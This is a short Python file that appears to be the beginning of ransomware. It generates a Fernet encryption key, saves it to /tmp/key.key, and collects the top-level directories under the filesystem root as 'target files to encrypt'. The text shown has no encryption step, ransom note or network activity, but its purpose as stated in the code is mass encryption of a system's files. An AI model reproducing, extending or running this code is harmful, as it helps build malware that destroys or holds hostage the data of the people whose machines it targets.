import os
from cryptography.fernet import Fernet


def create_symmetric_key() -> (bytes, str):
    """
    Generate AES key

    :return: Symmetric key
    """

    os.chdir('/tmp')

    symmetric_key = Fernet.generate_key()
    with open('key.key', 'wb') as keyfile:
        keyfile.write(symmetric_key)

    key_path = '/tmp/key.key'

    return symmetric_key, key_path


def target_files():
    """
    Find target files to encrypt

    :return:
    """

    print('Locating target files...')
    targets = next(os.walk('/'))[1]
    return targets
